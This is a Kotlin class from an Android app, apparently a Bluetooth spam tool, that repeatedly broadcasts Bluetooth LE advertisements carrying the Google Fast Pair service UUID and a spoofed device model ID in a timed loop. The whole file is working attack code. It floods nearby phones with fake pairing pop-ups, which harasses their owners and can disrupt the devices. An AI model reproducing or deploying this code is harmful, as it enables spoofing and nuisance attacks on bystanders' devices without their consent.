package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import android.os.ParcelUuid
import java.util.UUID
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class FastPairSingleSpam(private val device: FastPairDevice) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    override fun start() {
        executor.execute {
            isSpamming = true
            val advertiser = BluetoothAdvertiser()
            val serviceUUID = ParcelUuid(UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"))
            val serviceData = Helper.convertHexToByteArray(device.value)
            val data = AdvertiseData.Builder()
                .addServiceData(serviceUUID, serviceData)
                .addServiceUuid(serviceUUID)
                .setIncludeTxPowerLevel(true)
                .build()

            while (isSpamming) {
                advertiser.advertise(data, null)
                blinkRunnable?.run()
                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (_: InterruptedException) {
                    break
                }
                advertiser.stopAdvertising()
            }
        }
    }

    override fun stop() {
        isSpamming = false
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun setBlinkRunnable(runnable: Runnable?) {
        blinkRunnable = runnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable
}

